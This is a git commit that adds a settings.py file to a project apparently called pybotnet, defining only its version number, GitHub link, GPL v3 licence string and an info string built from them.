468b42bd084f37e0a074d634a16312d46e37b5ed
onionj <onionj98@gmail.com>
2021-06-20 09:53:30 -0700

    add info

---
+++ settings.py
@@ -0,0 +1,10 @@
+
+pybotnet_version = 0.06
+pybotnet_github_link = 'https://github.com/onionj/pybotnet'
+pybotnet_licence = 'GNU GENERAL PUBLIC LICENSE ,Version 3, 29 June 2007'
+
+pybotnet_info = f"""
+pybotnet version: {pybotnet_version}
+pybotnet github link: {pybotnet_github_link}
+pybotnet licence: {pybotnet_licence}
+"""
